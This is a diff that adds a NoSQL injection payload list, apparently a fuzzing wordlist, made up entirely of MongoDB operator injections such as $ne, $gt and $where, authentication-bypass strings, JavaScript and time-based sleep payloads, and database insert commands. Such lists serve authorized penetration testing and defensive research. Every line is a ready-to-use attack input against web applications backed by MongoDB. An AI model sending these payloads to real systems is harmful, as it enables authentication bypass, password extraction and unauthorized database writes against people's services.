@@ -1,0 +1,59 @@
+" OR "" = "
+" OR 1 = 1 -- -
+""
+";return(true);var xyz='a
+$gt
+$ne
+$nin
+$where: '1 == 1'
+'
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+' OR '' = '
+' OR '1
+' OR 1 -- -
+' || 1==1%00
+' || 1==1//
+' } ], $comment:'successful MongoDB injection'
+'"\/$[].>
+'"\;{}
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+''
+', $or: [ {}, { 'a':'a
+', $where: '1 == 1
+', $where: '1 == 1'
+'/{}:
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+';return 'a'=='a' && ''=='
+';sleep(5000);
+';sleep(5000);'
+';sleep(5000);+'
+'||'1'=='1';//
+, $where: '1 == 1'
+--
+-- -
+//
+0;return true
+1, $where: '1 == 1'
+;
+;%00
+OR 1=1
+[$ne]=1
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+true, $where: '1 == 1'
+{ $ne: 1 }
+{"$func": "var_dump"}
+{"$gt": ""}
+{"$gt":""}
+{"$gt":-1}
+{"$ne":""}
+{"$ne":-1}
+{"$nin":1}
+{"$nin":[1]}
+{"$where":  "sleep(1000)"}
+{$gt: ''}
+|| '1'=='1
+|| 1==1
+||'a'\\'a
